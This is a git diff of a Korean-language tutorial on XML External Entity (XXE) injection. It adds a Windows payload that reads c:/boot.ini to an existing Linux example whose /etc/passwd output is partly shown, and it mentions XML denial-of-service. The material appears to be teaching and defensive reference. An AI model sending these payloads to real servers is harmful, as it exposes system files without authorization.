@@ -39,6 +39,8 @@ xml은 첫줄에 <<xml>xml> 태그를 이용하여 xml 문서임을 명시해야
 
 외부 엔티티를 선언하여 SYSTEM 키워드로 xml 파서를 발생시켜 서버 시스템이 접근하게 합니다.
 
+Linux
+
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
@@ -53,6 +55,14 @@ bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/bin/sh
+```
+
+Windows
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
 ```
 
 Dos 공격을 일으킬 수도 있는데 xml코드로 일으키는 Dos는 XDos 라고도 불린다.
